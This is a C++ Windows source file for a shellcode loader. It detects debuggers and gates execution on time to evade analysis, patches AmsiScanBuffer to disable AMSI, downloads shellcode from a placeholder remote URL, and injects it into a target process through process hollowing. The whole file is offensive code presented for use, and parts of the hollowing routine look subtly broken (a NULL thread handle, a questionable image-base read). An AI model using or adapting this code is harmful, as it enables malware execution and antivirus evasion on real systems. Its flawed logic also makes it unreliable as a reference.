#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <iostream>
#include <string>
#include <wininet.h>  // For InternetOpen and InternetOpenUrl functions

// Link with the WinINet library
#pragma comment(lib, "wininet.lib")

// Function declarations
void LogError(const char* message, NTSTATUS status = STATUS_SUCCESS);
BOOL CheckForDebuggerProcesses(void);
BOOL HollowProcessAndInjectShellcode(DWORD pid, const std::vector<uint8_t>& shellcode);
BOOL LoadShellcodeFromURL(const std::string& url, std::vector<uint8_t>& shellcode);
void DisableAMSI();

// Function implementations
void LogError(const char* message, NTSTATUS status) {
    std::cerr << "Error: " << message;
    if (status != STATUS_SUCCESS) {
        std::cerr << " Status: 0x" << std::hex << status;
    }
    std::cerr << std::endl;
}

BOOL CheckForDebuggerProcesses(void) {
    const std::vector<std::string> debuggerProcesses = {
        "ollydbg.exe",
        "x64dbg.exe",
        "windbg.exe",
        "idaq.exe"
    };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        LogError("Failed to create process snapshot.");
        return FALSE;
    }

    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    if (!Process32First(snapshot, &processEntry)) {
        LogError("Failed to retrieve first process.");
        CloseHandle(snapshot);
        return FALSE;
    }

    do {
        for (const auto& debugger : debuggerProcesses) {
            if (_stricmp(processEntry.szExeFile, debugger.c_str()) == 0) {
                CloseHandle(snapshot);
                return TRUE;
            }
        }
    } while (Process32Next(snapshot, &processEntry));

    CloseHandle(snapshot);
    return FALSE;
}

BOOL LoadShellcodeFromURL(const std::string& url, std::vector<uint8_t>& shellcode) {
    HINTERNET hInternet = InternetOpen(TEXT("ShellcodeLoader"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        LogError("InternetOpen failed", GetLastError());
        return FALSE;
    }

    HINTERNET hConnect = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        LogError("InternetOpenUrl failed", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    std::vector<uint8_t> buffer(4096);
    DWORD bytesRead = 0;
    BOOL success = TRUE;

    while (InternetReadFile(hConnect, buffer.data(), (DWORD)buffer.size(), &bytesRead) && bytesRead > 0) {
        shellcode.insert(shellcode.end(), buffer.begin(), buffer.begin() + bytesRead);
    }

    if (GetLastError() != ERROR_SUCCESS) {
        LogError("InternetReadFile failed", GetLastError());
        success = FALSE;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return success;
}

void DisableAMSI() {
    unsigned char amsiPatch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (ERROR_INVALID_PARAMETER)
        0xC3                           // ret
    };

    HMODULE amsiModule = GetModuleHandleA("amsi.dll");
    if (amsiModule) {
        FARPROC amsiScanBuffer = GetProcAddress(amsiModule, "AmsiScanBuffer");
        if (amsiScanBuffer) {
            DWORD oldProtect;
            VirtualProtect(amsiScanBuffer, sizeof(amsiPatch), PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(amsiScanBuffer, amsiPatch, sizeof(amsiPatch));
            VirtualProtect(amsiScanBuffer, sizeof(amsiPatch), oldProtect, &oldProtect);
        }
    }
}

BOOL HollowProcessAndInjectShellcode(DWORD pid, const std::vector<uint8_t>& shellcode) {
    typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
    typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    typedef BOOL(WINAPI* pGetThreadContext)(HANDLE, LPCONTEXT);
    typedef BOOL(WINAPI* pSetThreadContext)(HANDLE, const CONTEXT*);
    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef DWORD(WINAPI* pResumeThread)(HANDLE);

    pOpenProcess pOpenProc = (pOpenProcess)GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenProcess");
    pNtUnmapViewOfSection pNtUnmapView = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection");
    pGetThreadContext pGetThreadCtx = (pGetThreadContext)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetThreadContext");
    pSetThreadContext pSetThreadCtx = (pSetThreadContext)GetProcAddress(GetModuleHandle("kernel32.dll"), "SetThreadContext");
    pVirtualAllocEx pVirtAllocEx = (pVirtualAllocEx)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
    pWriteProcessMemory pWriteProcMem = (pWriteProcessMemory)GetProcAddress(GetModuleHandle("kernel32.dll"), "WriteProcessMemory");
    pResumeThread pResumeThrd = (pResumeThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "ResumeThread");

    HANDLE hProcess = pOpenProc(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        LogError("Failed to open process", GetLastError());
        return FALSE;
    }

    HANDLE hThread = NULL;  // Replace with a valid thread handle in the target process
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!pGetThreadCtx(hThread, &ctx)) {
        LogError("Failed to get thread context", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    PVOID imageBaseAddress;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, (PBYTE)ctx.Rip + 0x10, &imageBaseAddress, sizeof(PVOID), &bytesRead)) {
        LogError("Failed to read process memory", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (pNtUnmapView(hProcess, imageBaseAddress) != STATUS_SUCCESS) {
        LogError("Failed to unmap process section", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    PVOID remoteShellcode = pVirtAllocEx(hProcess, imageBaseAddress, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        LogError("Failed to allocate memory in target process", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!pWriteProcMem(hProcess, remoteShellcode, shellcode.data(), shellcode.size(), NULL)) {
        LogError("Failed to write shellcode to target process", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    #ifdef _WIN64
    ctx.Rip = (DWORD64)remoteShellcode;
    #else
    ctx.Eip = (DWORD)remoteShellcode;
    #endif

    if (!pSetThreadCtx(hThread, &ctx)) {
        LogError("Failed to set thread context", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    if (pResumeThrd(hThread) == (DWORD)-1) {
        LogError("Failed to resume thread", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    // Random delay to evade automated analysis
    Sleep((rand() % 5000) + 5000);

    // Enhanced anti-debugging and anti-VM checks
    if (IsDebuggerPresent() || CheckForDebuggerProcesses()) {
        std::cout << "Exiting due to environmental check failure." << std::endl;
        return 0;
    }

    // Wait for user interaction before proceeding
    while (GetAsyncKeyState(VK_SPACE) == 0) {
        Sleep(1000);
    }

    // Timing-based execution: Only execute between 2 AM and 4 AM
    SYSTEMTIME st;
    GetSystemTime(&st);
    if (st.wHour < 2 || st.wHour > 4) {
        std::cout << "Sleeping due to timing constraint." << std::endl;
        Sleep(3600000);  // Sleep for an hour
        return 0;
    }

    // Disable AMSI (Anti-Malware Scan Interface)
    DisableAMSI();

    // URL of the hosted shellcode
    std::string url = "http://yourserver.com/shellcode.bin";
   // Load shellcode from URL
    std::vector<uint8_t> shellcode;
    if (!LoadShellcodeFromURL(url, shellcode)) {
        LogError("Failed to load shellcode from URL");
        return 1;
    }

    // Target PID (replace with actual PID)
    DWORD pid = 1234;

    // Inject shellcode into the target process
    if (!HollowProcessAndInjectShellcode(pid, shellcode)) {
        LogError("Failed to inject shellcode into target process");
        return 1;
    }

    std::cout << "Shellcode injected successfully." << std::endl;
    return 0;
}